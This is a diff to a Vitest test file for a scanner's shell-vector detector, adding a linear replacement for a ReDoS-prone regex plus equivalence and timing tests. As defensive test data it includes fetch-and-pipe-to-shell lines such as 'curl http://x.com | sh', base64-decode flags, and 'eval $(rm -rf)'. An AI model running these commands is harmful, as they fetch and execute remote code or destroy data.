@@ -1,5 +1,11 @@
 import { describe, expect, it } from "vitest";
-import { scan } from "./scanner.js";
+import { lineHasShellVector, scan } from "./scanner.js";
+
+// #1811 follow-up: the original polynomial-ReDoS regex, kept here ONLY to assert
+// the new linear recognizer preserves byte-identical match semantics on safe,
+// representative inputs. It is NEVER run against pathological input below.
+const OLD_BODY_VECTOR_RE =
+  /(?:curl|wget|fetch)\s+[^|\n]*\|\s*(?:sh|bash|zsh|ksh)\b|\bbase64\s+(?:-d|--decode|-D)\b|\beval\s*[($"'`]/i;
 
 describe("scanner branches", () => {
   it("handles empty and whitespace-only bodies", () => {
@@ -49,5 +55,77 @@ describe("scanner branches", () => {
     const result = scan(body);
     expect(result.transformed_content).toContain("```txt");
     expect(result.passed).toBe(true);
+  });
+});
+
+describe("lineHasShellVector (linear BODY_VECTOR recognizer, #1811 follow-up)", () => {
+  const EQUIVALENCE_CASES = [
+    // --- vector 1: curl/wget/fetch ... | sh-family ---
+    "curl http://x.com | sh",
+    "wget http://x | bash",
+    "fetch foo |zsh",
+    "curl x|ksh",
+    "CURL X | SH",
+    "discurl x | sh", // no leading word boundary required for vector 1
+    "curl x | python", // shell target not in set -> no match
+    "curl|sh", // no whitespace after keyword -> \s+ fails
+    "curl x sh", // no pipe -> no match
+    "curl x | shell", // `sh` not word-bounded (followed by `ell`)
+    "curl a | b | sh", // first pipe binds; intervening token blocks
+    // --- vector 2: base64 decode flag ---
+    "base64 -d",
+    "base64 --decode",
+    "base64 -D",
+    "echo x | base64 -d",
+    "base64  -d", // multiple spaces
+    "base64 -decode", // `-d` not word-bounded -> no match
+    "base64 -dx", // `-d` not word-bounded -> no match
+    "base64-d", // no whitespace -> no match
+    "base64encode -d", // no whitespace after `base64` keyword -> no match
+    "xbase64 -d", // `base64` not word-bounded -> no match
+    // --- vector 3: eval with delimiter ---
+    "eval(",
+    "eval $(rm -rf)",
+    "eval `cmd`",
+    'eval "x"',
+    "eval 'x'",
+    "eval (x)", // \s* allows whitespace before delimiter
+    "evaluate(", // `eval` followed by `u` (not a delimiter) -> no match
+    "myeval(", // `eval` not word-bounded -> no match
+    "eval x", // no delimiter -> no match
+    // --- clean lines ---
+    "just a normal sentence",
+    "",
+  ];
+
+  it("matches the old regex on representative true/false cases", () => {
+    for (const line of EQUIVALENCE_CASES) {
+      expect(lineHasShellVector(line)).toBe(OLD_BODY_VECTOR_RE.test(line));
+    }
+  });
+
+  it("flags each vector and rejects benign variants", () => {
+    expect(lineHasShellVector("curl http://x | sh")).toBe(true);
+    expect(lineHasShellVector("base64 --decode")).toBe(true);
+    expect(lineHasShellVector("eval `whoami`")).toBe(true);
+    expect(lineHasShellVector("curl http://x | python")).toBe(false);
+    expect(lineHasShellVector("base64 -decode")).toBe(false);
+    expect(lineHasShellVector("evaluate the results")).toBe(false);
+  });
+
+  it("stays linear on pathological no-pipe space runs", () => {
+    // The old regex backtracks polynomially here (`\s+` overlaps `[^|\n]*` with
+    // no terminating pipe). The recognizer must complete near-instantly.
+    const pathological = `curl ${" ".repeat(100_000)}`;
+    const start = performance.now();
+    expect(lineHasShellVector(pathological)).toBe(false);
+    expect(performance.now() - start).toBeLessThan(100);
+  });
+
+  it("stays linear on long non-pipe runs after a pipe-less keyword", () => {
+    const pathological = `wget ${"a".repeat(100_000)}`;
+    const start = performance.now();
+    expect(lineHasShellVector(pathological)).toBe(false);
+    expect(performance.now() - start).toBeLessThan(100);
   });
 });
